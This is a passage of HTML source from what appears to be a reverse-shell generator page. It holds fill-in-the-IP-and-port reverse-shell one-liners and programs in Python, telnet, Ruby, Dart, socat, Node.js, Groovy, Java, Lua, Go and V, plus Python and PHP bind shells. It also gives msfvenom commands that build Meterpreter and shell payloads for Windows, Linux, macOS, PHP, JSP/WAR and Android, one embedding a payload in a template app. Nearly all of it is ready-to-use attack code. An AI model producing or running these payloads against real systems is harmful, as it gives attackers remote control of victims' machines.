    <p id="ip fifty seven"></p>
     <p>",</p>
    <p id="port fifty seven"></p>
    
   <p> ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("</p>
     <div class="twentyeight"> </div>
 <p>  ")'</p>
    
    
 </div>
</div>
</div>
 


<div id="py3short" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
  
   <div id="mydiv">
    <p>
    
    python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("
    </p>
     <p id="ip fifty eight"></p>
     <p>",</p>
    <p id="port fifty eight"></p>
    
    
    
   <p> ));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("</p>
    
    <div class="twentynine"> </div>
    
    
   <p> ")'
    
    </p>
    
</div>
</div>
</div>

 
 


<div id="telnet" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
  <div id="mydiv">
    <p>
    TF=$(mktemp -u);mkfifo $TF && telnet&nbsp</p>
    
     <p id="ip fifty nine"></p>
     <p>&nbsp</p>
    <p id="port fifty nine"></p>
    
    <p>&nbsp0&lt$TF |</p>
    
    </p>&nbsp</p>
    
    <div class="thirty"> </div>
    
    <p>&nbsp1>$TF</p>
     
</div>
</div>

 </div>

<div id="ruby1" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
   <div id="mydiv">
    <p>
    ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("</p>
    
      <p id="ip sixty"></p>
     <p>",</p>
    <p id="port sixty"></p>
    
   <p> ))'
   
    </p>
    
  </div>
</div>
</div>


<div id="rubynosh" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
     <div id="mydiv">
    <p>
    
    ruby -rsocket -e'exit if fork;c=TCPSocket.new("</p>
    
     <p id="ip sixty one"></p>
     <p>","</p>
    <p id="port sixty one"></p>
    
    
  <p>  ");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
    
    </p>
     
</div>
</div>
  </div>


<div id="dart" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
    <p>
    
  <p>    import 'dart:io'; </p>
<p>  import 'dart:convert'; </p>

<p>  main() { </p>

<p>
 <div id="mydiv">
 <p>   Socket.connect("
   <p id="ip sixty two"></p>
 <p>", </p>
   <p id="port sixty two"></p>
<p> ).then((socket) { </p>


</div>
</p>

    <p>  socket.listen((data) { </p>
    
    <p>
     <div id="mydiv">
     <p>   Process.start('
     
     <div class="thirtyone"> </div>
     
     ', []).then((Process process) { </p>
     
     </div>
     </p>
     
      <p>    process.stdin.writeln(new String.fromCharCodes(data).trim()); </p>
      <p>    process.stdout </p>
      <p>      .transform(utf8.decoder) </p>
       <p>     .listen((output) { socket.write(output); }); </p>
    <p>    }); </p>
   <p>   }, </p>
   <p>   onDone: () { </p>
   <p>     socket.destroy(); </p>
  <p>    }); </p>
 <p>   }); </p>
<p>  } </p>
    
    </p>
     
     
</div>
</div>



 



<div id="socat1" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
      <div id="mydiv">
    <p>  socat TCP:
      <p id="ip sixty three"></p>
    <p>:</p>
     <p id="port sixty three"></p>
      <p> &nbsp</p>
    EXEC: </p>
    <div class="thirtytwo"> </div>
 </div>
</div>
</div>


<div id="socat2" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
    <div id="mydiv">
    <p> socat TCP:</p>
     <p id="ip sixty four"></p>
    <p>:</p>
     <p id="port sixty four"></p>
   <p> EXEC:'</p>
     <div class="thirtythree"> </div>
   <p> ',pty,stderr,setsid,sigint,sane</p>
  
 </div>
</div>
</div>


<div id="nodejs" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
  <div id="mydiv">
    <p> require('child_process').exec('nc -e&nbsp</p>
    
   <div class="thirtyfour"> </div>
   <p> &nbsp</p>
  <p id="ip sixty five"></p>
    <p> &nbsp</p>
    <p id="port sixty five"></p>
    <p>')</p>
 </div>
     
</div>
</div>



<div id="nodejs2" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
    <p>
    
     <p> (function(){ </p>
    <p>  var net = require("net"), </p>
        <p>  cp = require("child_process"), </p>
        
         <p> <div id="mydiv">
        <p>  sh = cp.spawn(" </p>
        <div class="thirtyfive"> </div>
        <p>  ", []); </p>
        </div>
        </p>
  <p>  var client = new net.Socket();</p>
    <p>
      <div id="mydiv">
   <p> client.connect(</p>
    <p id="port sixty six"></p>
  <p> , "</p>
    <p id="ip sixty six"></p>
   <p> ", function(){</p>
    </div>
    </p>
        <p>  client.pipe(sh.stdin); </p>
        <p>  sh.stdout.pipe(client); </p>
        <p>  sh.stderr.pipe(client); </p>
    <p>  }); </p>
    <p>  return /a/; // Prevents the Node.js application from crashing </p>
 <p> })(); </p>
 
 
 </p>
     
     
</div>
</div>


<div id="groovy" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
  <div id="mydiv">
    <p>
    String host="</p>
    <p id="ip sixty seven"></p>
    
   <p> ";int port=</p>
    <p id="port sixty seven"></p>
    <p>;String cmd="</p>
    
     <div class="thirtysix"> </div>
    <p>";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</p>
    
     
     
  </div>
</div>
</div>


<div id="java1" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
    <p>
    
    
    <p> public class shell {</p>
   <p>  public static void main(String[] args) {</p>
   <p>      Process p;</p>
   <p>      try {</p>
   
     <p>  <div id="mydiv">
           <p> p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/</p>
           
            <p id="ip sixty eight"></p>
        
        <p>/</p>
            <p id="port sixty eight"></p>
       <p> &nbsp0>&1")</p>
            </div>
            </p>
           <p>  p.waitFor();</p>
           <p>  p.destroy();</p>
      <p>   } catch (Exception e) {}</p>
    <p> }</p>
<p> } </p>

</p>
  
     
</div>
</div>



<div id="java2" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
    <p>   public class shell {</p>
    <p>  public static void main(String[] args) {</p>
    
    <p>
         <div id="mydiv">
     <p>   ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/</p>
            <p id="ip sixty nine"></p>
        
        <p>/</p>
            <p id="port sixty nine"></p>
       <p> &nbsp0>&1")</p>
        
        
        </div>
        </p>
        <p>      .redirectErrorStream(true);</p>
     <p>     try {</p>
          <p>    Process p = pb.start();</p>
             <p> p.waitFor();</p>
            <p>  p.destroy();</p>
        <p>  } catch (Exception e) {}</p>
    <p>  }</p>
 <p> }</p>
</p>
     
</div>
</div>



<div id="java3" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
    <p>
    
    
    
   <p>   import java.io.InputStream;</p>
<p>  import java.io.OutputStream;</p>
<p>  import java.net.Socket;</p>

<p>  public class shell {</p>
   <p>   public static void main(String[] args) {</p>
   <p>
      <div id="mydiv">
   <p>       String host = "
     <p id="ip seventy"></p>
   <p>";</p>
   </div>
      <div id="mydiv">
    <p>      int port = </p>
      <p id="port seventy"></p>
    <p>;</p>
    </div>
     <div id="mydiv">
     <p>     String cmd = "
       <div class="thirtyseven"> </div>
     </p>
    <p> ";</p>
    </div>
     <p>     try {</p>
     <p>         Process p = new </p>
     <p>  ProcessBuilder(cmd).redirectErrorStream(true).start();</p>
          <p>    Socket s = new Socket(host, port);</p>
           <p>   InputStream pi = p.getInputStream(), pe = </p>
           <p>  p.getErrorStream(), si = s.getInputStream();</p>
            <p>  OutputStream po = p.getOutputStream(), so = </p>
            <p>  s.getOutputStream();</p>
            <p>  while (!s.isClosed()) {</p>
             <p>     while (pi.available() > 0)</p>
                  <p>    so.write(pi.read());</p>
               <p>   while (pe.available() > 0)</p>
               <p>       so.write(pe.read());</p>
              <p>    while (si.available() > 0)</p>
               <p>       po.write(si.read());</p>
              <p>    so.flush();</p>
              <p>    po.flush();</p>
               <p>   Thread.sleep(50);</p>
               <p>   try {</p>
                    <p>  p.exitValue();</p>
                    <p>  break;</p>
                <p>  } catch (Exception e) {}</p>
           <p>   }</p>
         <p>     p.destroy();</p>
        <p>      s.close();</p>
      <p>    } catch (Exception e) {}</p>
   <p>   }</p>
<p>  } </p>

</p>
   
     
</div>
</div>


<div id="js" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
    <p>
      <div id="mydiv">
  <p>  String command = "var host = '</p>
  <p id="ip seventy one"></p>
  <p>';" +</p>
  
  </div>
  
  <p>
  <div id="mydiv">
                      <p> "var port = </p>
                      
                        <p id="port seventy one"></p>
                      ;" +</p>
                      </div>
                      
                        <div id="mydiv">
                      <p> "var cmd = '
                      
                        <div class="thirtyeight"> </div>
                      ';"+</p>
                      </div>
                      </p>
                      
                      <p> "var s = new java.net.Socket(host, port);" +</p>
                   <p>    "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+</p>
                    <p>   "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+</p>
                   <p>    "var po = p.getOutputStream(), so = s.getOutputStream();"+</p>
                     <p>  "print ('Connected');"+</p>
                     <p>  "while (!s.isClosed()) {"+</p>
                      <p> "    while (pi.available() > 0)"+</p>
                     <p>  "        so.write(pi.read());"+</p>
                      <p> "    while (pe.available() > 0)"+</p>
                    <p>   "        so.write(pe.read());"+</p>
                   <p>    "    while (si.available() > 0)"+</p>
                     <p>  "        po.write(si.read());"+</p>
                     <p>  "    so.flush();"+</p>
                      <p> "    po.flush();"+</p>
                    <p>   "    java.lang.Thread.sleep(50);"+</p>
                     <p>  "    try {"+</p>
                      <p> "        p.exitValue();"+</p>
                     <p>  "        break;"+</p>
                      <p> "    }"+</p>
                      <p>  "    catch (e) {"+</p>
                     <p>   "    }"+</p>
                     <p>   "}"+</p>
                      <p>  "p.destroy();"+</p>
                     <p>   "s.close();";</p>
 <p>String x =</p>  <p>"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
ref.add(new StringRefAddr("x", x);</p>
    
    </p>
   
     
</div>
</div>


<div id="lua1" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
   <div id="mydiv">
    <p> lua -e "require('socket');require('os');t=socket.tcp();t:connect('</p>
    
    <p id="ip seventy two"></p>
     <p> ','</p>
    <p id="port seventy two"></p>
    
    <p>');os.execute('</p>
     <p> &nbsp</p>
    <div class="thirtynine"> </div>
     <p> &nbsp</p>
   <p> -i &lt&3 >&3 2>&3');"
    </p>
  </div>
</div>
</div>

<div id="lua2" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
  <div id="mydiv">
    <p> lua5.1 -e 'local host, port = "</p>
    
    
        <p id="ip seventy three"></p>
     <p> ",</p>
    <p id="port seventy three"></p>
    
     <p> &nbsp</p>
    <p> local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' </p>
     
  </div>
</div>
</div>

<div id="golang" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
  
   <div id="mydiv">
    <p> echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","</p>
    
     <p id="ip seventy four"></p>
     <p> :</p>
    <p id="port seventy four"></p>
   <p> ");cmd:=exec.Command("</p>
    
    <div class="fourty"> </div>
    
    <p>");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go </p>
    
  </div>
</div>
</div>

<div id="vlang" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
  <div id="mydiv">
    <p> echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e &nbsp</p>
     <div class="fourtyone"> </div>
  <p>  &nbsp</p>
  <p id="ip seventy five"></p>
     <p> &nbsp</p>
    <p id="port seventy five"></p>
<p>    &nbsp</p>

    
  <p>  &nbsp0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v </p>
    </div>
     
 
</div>
</div>



</div>
</div>
</div>

<div id="Bind" class="w3-container city w3-animate-opacity">
 
 <br>
 <br>
<div class="w3-container">
 <div id="no">
<br>
<div class="tab">
  <button class="tablinks" onclick=" City(event, 'Python3 Bind')" id="defaultOpen">Python3 Bind</button>
  <button class="tablinks" onclick=" City(event, 'PHP Bind')">PHP Bind</button>
</div>

<div id="Python3 Bind" class="tabcontent">
 
  <h3 class="w3-text-theme w3-large w3-display-container">
 
  <p>
  <div id="mydiv">
  <p>
  python3 -c 'exec("""import socket as s,
  subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);
  s1.setsockopt(s.SOL_SOCKET,
  s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",
</p>
<p id="port again"></p>

<p>
));s1.listen(1);c,a=s1.accept();
while True: d=c.recv(1024).decode();p=sp.Popen
(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,
stdin=sp.PIPE);c.sendall
(p.stdout.read()+p.stderr.read())""")'
</p>
</div>
</p>
  </div>


 
  

<div id="PHP Bind" class="tabcontent">
 
  <h3 class="w3-text-theme w3-large w3-display-container">
   <p>
   <div id="mydiv">
  <p>
  php -r '$s=socket_create
  (AF_INET,SOCK_STREAM,SOL_TCP);
  socket_bind($s,"0.0.0.0",
  </p>
 
 <p id="port once again"></p>
 
 <p>
 );
  socket_listen($s,1);$cl=socket_accept($s);
  while(1){if(!socket_write($cl,"$ ",2))exit;
  $in=socket_read($cl,100);
  $cmd=popen("$in","r");while(!feof($cmd))
  {$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'
  </p>
</div>
</p>

</div>
 
</div>
 </div>
 
 </div>
 
  
<div id="MSFVenom" class="w3-container city w3-animate-opacity">
 
 <br>
<div id="no">
 
<div class="w3-container float-left-child">
 <div class=" tab vertical-menu w3-bar-item w3-container">
 

  <button class="tablinks" onclick="City(event, 'WMSR')" id="openagain">Windows Meterpreter Staged Reverse TCP (x64)</button>
  <button class="tablinks" onclick="City(event, 'WMSlessR')">Windows Meterpreter Stageless Reverse TCP (x64)</button>
  <button class="tablinks" onclick="City(event, 'WSR')">Windows Staged Reverse TCP (x64)</button>
    <button class="tablinks" onclick="City(event, 'WSRTCP')">Windows Stageless Reverse TCP (x64)</button>
      <button class="tablinks" onclick="City(event, 'LMSR')">Linux Meterpreter Staged Reverse TCP (x64)</button>
        <button class="tablinks" onclick="City(event, 'LSR')">Linux Stageless Reverse TCP (x64)</button>
            <button class="tablinks" onclick="City(event, 'WBTS')">Windows Bind TCP ShellCode - BOF</button>
                <button class="tablinks" onclick="City(event, 'mmSRT')">macOS Meterpreter Staged Reverse TCP (x64)</button>
                        <button class="tablinks" onclick="City(event, 'mmsR')">macOS Meterpreter Stageless Reverse TCP (x64)</button>
                         <button class="tablinks" onclick="City(event, 'msR')">macOS Stageless Reverse TCP (x64)</button>
                          <button class="tablinks" onclick="City(event, 'PHPMSR')">PHP Meterpreter Stageless Reverse TCP</button>
                           <button class="tablinks" onclick="City(event, 'PHPR')">PHP Reverse PHP</button>
                           <button class="tablinks" onclick="City(event, 'JSRT')">JSP Stageless Reverse TCP</button>
                             <button class="tablinks" onclick="City(event, 'WSRT')">WAR Stageless Reverse TCP</button>
                                   <button class="tablinks" onclick="City(event, 'AMRT')">Android Meterpreter Reverse TCP</button>
                                         <button class="tablinks" onclick="City(event, 'AMERT')">Android Meterpreter Embed Reverse TCP</button>
                                         
                                            <button class="tablinks" onclick="City(event, 'PSRT')">Python Stageless Reverse TCP</button>
                                         
                                            <button class="tablinks" onclick="City(event, 'BSRT')">Bash Stageless Reverse TCP</button>
</div>
</div>

 
  

<div id="WMSR" class="tabcontent">
 
 
  <h3 class=" w3-large w3-display-container">
  <div id="mydiv">
   <p>msfvenom -p windows/x64/meterpreter/reverse_tcp &nbsp </p>
   <p>LHOST=</p>
   <p id="ip one"></p>
   <p> &nbsp LPORT=</p>
   <p id="port one"></p>
   <p>&nbsp -f exe -o reverse.exe</p>
 </div>
  </div>
 

<div id="WMSlessR" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">
   <div id="mydiv">
  <p>msfvenom -p windows/x64/meterpreter_reverse_tcp &nbsp </p>
  
   <p>LHOST=</p>
   <p id="ip two"></p>
   <p> &nbsp LPORT=</p>
  
    <p id="port two"></p>
<p>&nbsp -f exe -o reverse.exe</p>
  
 </div>
</div>

<div id="WSR" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">
  <div id="mydiv">
<p> msfvenom -p windows/x64/shell/reverse_tcp &nbsp </p>
<p>LHOST=</p>
<p id="ip three"></p>
 <p> &nbsp LPORT=</p>
    <p id="port three"></p>
<p>&nbsp -f exe -o reverse.exe</p>
 
</div>
</div>
 
<div id="WSRTCP" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">
   <div id="mydiv">
<p> msfvenom -p windows/x64/shell_reverse_tcp &nbsp </p>
<p>LHOST=</p>
<p id="ip four"></p>

 <p>&nbsp LPORT=</p>
    <p id="port four"></p>
<p>&nbsp -f exe -o reverse.exe</p>

 
</div>
</div>

<div id="LMSR" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">
    <div id="mydiv">
<p> msfvenom -p linux/x64/meterpreter/reverse_tcp &nbsp </p>
<p>LHOST=</p>

 <p id="ip five"></p>
<p>&nbsp LPORT=</p>

<p id="port five"></p>

<p>&nbsp -f elf -o reverse.elf</p>

</div>
</div>


<div id="LSR" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">
 <div id="mydiv">
<p> msfvenom -p linux/x64/shell_reverse_tcp &nbsp </p>
<p>LHOST=</p>
<p id="ip six"></p>
<p>&nbsp LPORT=</p>
<p id="port six"></p>
<p> &nbsp -f elf -o reverse.elf</p>


</div>
</div>



<div id="WBTS" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">
  <div id="mydiv">
<p> msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '' -f python -v notBuf -o shellcode &nbsp </p>

</div>
</div>


<div id="mmSRT" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">
  <div id="mydiv">
<p> msfvenom -p osx/x64/meterpreter/reverse_tcp &nbsp </p>
<p>LHOST=</p>
<p id="ip seven"></p>

<p>&nbsp LPORT=</p>

<p id="port seven"></p>
<p>&nbsp -f macho -o shell.macho</p>

</div>
</div>

<div id="mmsR" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">
   <div id="mydiv">
<p> msfvenom -p osx/x64/meterpreter_reverse_tcp &nbsp </p>
<p>LHOST=</p>
<p id="ip eight"></p>

<p>&nbsp LPORT=</p>

<p id="port eight"></p>
<p>&nbsp -f macho -o shell.macho</p>
 
</div>
</div>

<div id="msR" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">
    <div id="mydiv">
<p> msfvenom -p osx/x64/shell_reverse_tcp &nbsp </p>
<p>LHOST=</p>

<p id="ip nine"></p>
<p>&nbsp LPORT=</p>


<p id="port nine"></p>

<p>&nbsp -f macho -o shell.macho</p>
</div>
</div>

<div id="PHPMSR" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">
     <div id="mydiv">
<p> msfvenom -p php/meterpreter_reverse_tcp &nbsp </p>
<p>LHOST=</p>
<p id="ip ten"></p>

<p>&nbsp LPORT=</p>

<p id="port ten"></p>
<p>&nbsp  -f raw -o shell.php</p>

 </div>
</div>

<div id="PHPR" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">
     <div id="mydiv">
<p> msfvenom -p php/reverse_php &nbsp   </p>
<p>LHOST=</p>
<p id="ip eleven"></p>
<p>&nbsp LPORT=</p>

<p id="port eleven"></p>
<p> &nbsp -o shell.php</p>
</div>

</div>

<div id="JSRT" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">
     <div id="mydiv">
<p> msfvenom -p java/jsp_shell_reverse_tcp &nbsp </p>
<p>LHOST=</p>
<p id="ip twelve"></p>
<p>&nbsp LPORT=</p>

<p id="port twelve"></p>
<p> &nbsp -f raw -o shell.jsp</p>


</div>
</div>
 
<div id="WSRT" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">
      <div id="mydiv">
<p> msfvenom -p java/jsp_shell_reverse_tcp &nbsp </p>
<p>LHOST=</p>
<p id="ip thirteen"></p>

<p>&nbsp LPORT=</p>


<p id="port thirteen"></p>
<p>&nbsp -f war -o shell.war</p>


</div>
</div>

<div id="AMRT" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">
  <div id="mydiv">
<p> msfvenom --platform android -p android/meterpreter/reverse_tcp &nbsp
</p>
<p>lhost=</p>
<p id="ip fourteen"></p>

 <p> &nbsp lport=</p>
<p id="port fourteen"></p>
<p> &nbsp R -o malicious.apk</p>

 </div>
</div>


<div id="AMERT" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">
 <div id="mydiv">
<p> msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp  &nbsp
</p>
<p> lhost=</p>
<p id="ip fifteen"></p>

<p>
&nbsp lport=
</p>
<p id="port fifteen"></p>

<p>
 &nbsp -o payload.apk</p>

</div>
</div>


<div id="PSRT" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">
  <div id="mydiv">
<p> msfvenom -p cmd/unix/reverse_python &nbsp
</p>
<p> LHOST=</p>
<p id="ip sixteen"></p>

<p>
&nbsp LPORT=</p>

<p id="port sixteen"></p>
<p>

&nbsp -f raw -o shell.py</p>


</div>

</div>

<div id="BSRT" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">
 <div id="mydiv">
<p>msfvenom -p cmd/unix/reverse_bash &nbsp
</p>
<p> LHOST=</p>
<p id="ip seventeen"></p>
<p>
&nbsp LPORT=</p>

<p id="port seventeen"></p>
<p>
&nbsp -f raw -o shell.sh</p>


</div>
</div>

</div>
</div>


<!-- Script for Sidebar, Tabs, Accordions, Progress bars and slideshows -->
<script>
const selectedElement = document.querySelector('.shell');

selectedElement.addEventListener('change', (event) => {
  const shellans = document.querySelector('.shellans');
  shellans.textContent = `  ${event.target.value}`;
});

</script>

<script>
const selecteddElement = document.querySelector('.shell');

selecteddElement.addEventListener('change', (event) => {
  const one = document.querySelector('.one');
  one.textContent = `  ${event.target.value}`;
});

</script>

 
 <script>
const two = document.querySelector('.shell');

two.addEventListener('change', (event) => {
  const two = document.querySelector('.two');
  two.textContent = `  ${event.target.value}`;
});

</script>
     
      <script>
const three = document.querySelector('.shell');

three.addEventListener('change', (event) => {
  const three = document.querySelector('.three');
  three.textContent = `  ${event.target.value}`;
});

</script>
 <script>
const four = document.querySelector('.shell');

four.addEventListener('change', (event) => {
  const four = document.querySelector('.four');
  four.textContent = `  ${event.target.value}`;
});

</script>
 <script>
const five = document.querySelector('.shell');

five.addEventListener('change', (event) => {
  const five = document.querySelector('.five');
  five.textContent = `  ${event.target.value}`;
});

</script>


 <script>
const six = document.querySelector('.shell');

six.addEventListener('change', (event) => {
  const six = document.querySelector('.six');
  six.textContent = `  ${event.target.value}`;
});

</script>
<script>
const seven = document.querySelector('.shell');

seven.addEventListener('change', (event) => {
  const seven = document.querySelector('.seven');
  seven.textContent = `  ${event.target.value}`;
});

</script>

 <script>
const eight = document.querySelector('.shell');

eight.addEventListener('change', (event) => {
  const eight = document.querySelector('.eight');
  eight.textContent = `  ${event.target.value}`;
});

</script>
<script>
const nine = document.querySelector('.shell');

nine.addEventListener('change', (event) => {
  const nine = document.querySelector('.nine');
  nine.textContent = `  ${event.target.value}`;
});

</script>
 
 <script>
const ten = document.querySelector('.shell');

ten.addEventListener('change', (event) => {
  const ten = document.querySelector('.ten');
  ten.textContent = `  ${event.target.value}`;
});

</script>

<script>
const eleven = document.querySelector('.shell');

eleven.addEventListener('change', (event) => {
  const eleven = document.querySelector('.eleven');
  eleven.textContent = `  ${event.target.value}`;
});

</script>
<script>
const twelve = document.querySelector('.shell');

twelve.addEventListener('change', (event) => {
  const twelve = document.querySelector('.twelve');
  twelve.textContent = `  ${event.target.value}`;
});

</script>
 <script>
const thirteen = document.querySelector('.shell');

thirteen.addEventListener('change', (event) => {
  const thirteen = document.querySelector('.thirteen');
  thirteen.textContent = `  ${event.target.value}`;
});

</script>
 <script>
const fourteen = document.querySelector('.shell');

fourteen.addEventListener('change', (event) => {
  const fourteen = document.querySelector('.fourteen');
  fourteen.textContent = `  ${event.target.value}`;
});

</script>
 <script>
const fifteen = document.querySelector('.shell');

fifteen.addEventListener('change', (event) => {
  const fifteen = document.querySelector('.fifteen');
  fifteen.textContent = `  ${event.target.value}`;
});

</script>
 <script>
const sixteen = document.querySelector('.shell');

sixteen.addEventListener('change', (event) => {
  const sixteen = document.querySelector('.sixteen');
  sixteen.textContent = `  ${event.target.value}`;
});

</script>
 <script>
const seventeen = document.querySelector('.shell');

seventeen.addEventListener('change', (event) => {
  const seventeen = document.querySelector('.seventeen');
  seventeen.textContent = `  ${event.target.value}`;
});

</script>
 <script>
const eighteen = document.querySelector('.shell');

eighteen.addEventListener('change', (event) => {
  const eighteen = document.querySelector('.eighteen');
  eighteen.textContent = `  ${event.target.value}`;
});

</script>

<script>
const nineteen = document.querySelector('.shell');

nineteen.addEventListener('change', (event) => {
  const nineteen = document.querySelector('.nineteen');
  nineteen.textContent = `  ${event.target.value}`;
});

</script>
 <script>
const twenty = document.querySelector('.shell');

twenty.addEventListener('change', (event) => {
  const twenty = document.querySelector('.twenty');
  twenty.textContent = `  ${event.target.value}`;
});

</script>
 <script>
const twentyone = document.querySelector('.shell');

twentyone.addEventListener('change', (event) => {
  const twentyone = document.querySelector('.twentyone');
  twentyone.textContent = `  ${event.target.value}`;
});

</script>
 
 <script>
const twentytwo = document.querySelector('.shell');

twentytwo.addEventListener('change', (event) => {
  const twentytwo = document.querySelector('.twentytwo');
  twentytwo.textContent = `  ${event.target.value}`;
});

</script>

 <script>
const twentythree = document.querySelector('.shell');

twentythree.addEventListener('change', (event) => {
  const twentythree = document.querySelector('.twentythree');
  twentythree.textContent = `  ${event.target.value}`;
});

</script>
<script>
const twentyfour = document.querySelector('.shell');

twentyfour.addEventListener('change', (event) => {
  const twentyfour = document.querySelector('.twentyfour');
  twentyfour.textContent = `  ${event.target.value}`;
});

</script>

 <script>
const twentyfive = document.querySelector('.shell');

twentyfive.addEventListener('change', (event) => {
  const twentyfive = document.querySelector('.twentyfive');
  twentyfive.textContent = `  ${event.target.value}`;
});

</script>

 <script>
const twentysix = document.querySelector('.shell');

twentysix.addEventListener('change', (event) => {
  const twentysix = document.querySelector('.twentysix');
  twentysix.textContent = `  ${event.target.value}`;
});

</script>
 <script>
const twentyseven = document.querySelector('.shell');

twentyseven.addEventListener('change', (event) => {
  const twentyseven = document.querySelector('.twentyseven');
  twentyseven.textContent = `  ${event.target.value}`;
});

</script>
 <script>
const twentyeight = document.querySelector('.shell');

twentyeight.addEventListener('change', (event) => {
  const twentyeight = document.querySelector('.twentyeight');
  twentyeight.textContent = `  ${event.target.value}`;
});

</script>
 
 <script>
const twentynine = document.querySelector('.shell');

twentynine.addEventListener('change', (event) => {
  const twentynine = document.querySelector('.twentynine');
  twentynine.textContent = `  ${event.target.value}`;
});


</script>

 <script>
const thirty = document.querySelector('.shell');

thirty.addEventListener('change', (event) => {
  const thirty = document.querySelector('.thirty');
  thirty.textContent = `  ${event.target.value}`;
});

</script>

 <script>
const thirtyone = document.querySelector('.shell');

thirtyone.addEventListener('change', (event) => {
  const thirtyone = document.querySelector('.thirtyone');
  thirtyone.textContent = `  ${event.target.value}`;
});

</script>
 
 <script>
const thirtytwo = document.querySelector('.shell');

thirtytwo.addEventListener('change', (event) => {
  const thirtytwo = document.querySelector('.thirtytwo');
  thirtytwo.textContent = `  ${event.target.value}`;
});

</script>

 <script>
const thirtythree = document.querySelector('.shell');

thirtythree.addEventListener('change', (event) => {
  const thirtythree = document.querySelector('.thirtythree');
  thirtythree.textContent = `  ${event.target.value}`;
});

</script>
<script>
